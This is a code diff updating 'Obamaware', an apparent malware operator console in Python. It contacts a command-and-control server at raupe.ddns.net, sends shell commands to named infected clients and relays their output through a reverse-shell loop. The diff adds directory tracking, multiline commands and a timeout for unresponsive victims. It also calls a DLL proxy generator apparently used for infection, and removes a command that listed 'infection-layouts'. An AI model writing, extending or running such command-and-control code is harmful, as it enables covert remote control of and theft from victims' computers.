@@ -10,7 +10,7 @@ Success = "\033[32m[+]\033[0m"
 Status = "\033[94m[*]\033[0m"
 
 url = "http://raupe.ddns.net/cdr"
-body = "USER ||| GET"
+body = "USER ### GET"
 
 
 class Obamaware(cmd.Cmd):
@@ -20,13 +20,17 @@ class Obamaware(cmd.Cmd):
     def __init__(self):
         super().__init__()
         self.revshell = False
-        self.lastout = ""
+        self.revname = ""
+        self.cd = False
+        self.do_clear("")
+        self.lastout = True
+        self.inactivitycounter = 0
     
     def safe_print(self, text):
         sys.stdout.write("\r")                    # Return to start of line
         sys.stdout.write(" " * (len(self.prompt) + 80)) # Clear the line (arbitrary width)
         sys.stdout.write("\r")                    # Return to start again
-        print(text)                               # Print the output
+        print(text+"\n")                               # Print the output
         sys.stdout.write(self.prompt)                  # Reprint the prompt
         sys.stdout.flush()
     
@@ -37,33 +41,75 @@ class Obamaware(cmd.Cmd):
                 break
             try:
                 resp = requests.post(url, data=body.replace("USER", name), timeout=3)
-                if len(resp.text.split(" ||| ", 1)) >= 2 and resp.text.split(" ||| ", 1)[1] != self.lastout and "execute" not in resp.text.split(" ||| ", 1)[0]:
-                    self.safe_print(resp.text.split(" ||| ", 1)[1])
-                    self.lastout = resp.text.split(" ||| ", 1)[1]
+                response = resp.text.split(" ### ", 1)
+                if "output" in response[0] and not self.lastout:
+                    if len(response) > 1:
+                        if "__NO_PAYLOAD__" not in response[1]:
+                            self.inactivitycounter = 0
+                            if self.cd:
+                                self.cd = False
+                                self.prompt = f'{Status} {resp.text.split(" ### ", 1)[1].strip()}>'
+                                self.safe_print("")
+                            else:
+                                self.safe_print(f"{Success} {resp.text.split(' ### ', 1)[1].strip()}")
+                            self.lastout = True
             except requests.RequestException as e:
                 pass
+            if self.inactivitycounter >= 5:
+                self.inactivitycounter = 0
+                self.do_EOF("")
+                self.safe_print(f"{ErrorSign} No response from client. Reverse shell stopped.")
+            elif self.lastout and "execute" in resp.text.split(" ### ", 1)[0]:
+                self.inactivitycounter += 1
             time.sleep(3)
+
+    def do_cd(self, line):
+        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
+        self.cd = True
+        if args:
+            self.send_request("POST", self.revname, f"cd {args}\ncd").strip("\r\n")
+        else:
+            self.send_request("POST", self.revname, "cd")
 
     def send_request(self, mode, name, cmd=None):
         if mode == "GET":
             try:
                 resp = requests.post(url, data=body.replace("USER", name), timeout=3)
-                self.prompt = f'Obamaware {name}>'
+                if resp:
+                    self.prompt = f'Obamaware {name}>'
+                else:
+                    return
                 if not self.revshell:
                     self.revshell = True
+                    self.revname = name
+                    print(f"{Status} Reverse shell started. Type 'exit' or 'EOF' to stop.")
+                    print(f"{Status} Type <<EOT to beginn a multiline command and EOT to send it.")
+                    print(f"{Status} Retrieving working directory...")
+                    self.prompt = f'{ErrorSign} If nothing happens, the client might be offline...'
                     self.stop = threading.Event()
                     t = threading.Thread(target=self.send_request_loop, args=(name, self.stop))
                     t.start()
-                self.lastout = resp.text
+                self.do_cd("")  # Get initial directory
+                return resp.text
             except requests.RequestException as e:
                 print(f"{ErrorSign} request failed:", e)
         elif mode == "POST" and cmd:
             try:
-                resp = requests.post(url, data=body.replace("USER", name).replace("GET", "execute ||| " + cmd), timeout=10)
+                resp = requests.post(url, data=body.replace("USER", name).replace("GET", "execute ### " + cmd), timeout=10)
+                self.lastout = False
+                return resp.text
             except requests.RequestException as e:
                 print("request failed:", e)
+                return
 
     # ----- basic shell commands -----
+    def multiline_command(self):
+        command = ""
+        line = ""
+        while line.strip() != "EOT":
+            line = input(">>")
+            command += line + "\n"
+        return command[:-4]
     def do_EOF(self, line):
         self.revshell = False
         if self.prompt == 'Obamaware>':
@@ -91,13 +137,6 @@ class Obamaware(cmd.Cmd):
         line = "null null " + line
         args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
         os.system('python DllProxyGenerator.py ' + args)
-    
-    def do_get(self, line):
-        print("")
-        if line.strip() == "layout":
-            if os.path.exists("layouts.txt"):
-                os.system('cat layouts.txt' if os.name != 'nt' else 'type layouts.txt')
-            print(f"{Status} The infection-layouts are stored in layouts.txt\n")
 
     def do_cmd(self, line):
         args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
@@ -106,6 +145,7 @@ class Obamaware(cmd.Cmd):
     def do_revshell(self, line):
         args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
         self.send_request("GET", args)
+    
 
     def do_help(self, line):
         print("\033[32mCommands:\033[0m")
@@ -118,8 +158,10 @@ class Obamaware(cmd.Cmd):
     
     def default(self, line):
         args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
+        if args == "EOT<<":
+            args = self.multiline_command()
         if self.revshell:
-            self.send_request("POST", self.prompt.split(" ", 1)[1].strip(">"),args)
+            self.send_request("POST", self.revname, args)
         else:
             print(f"{ErrorSign} Unknown command: {line}. Type 'help' to list commands.")
 
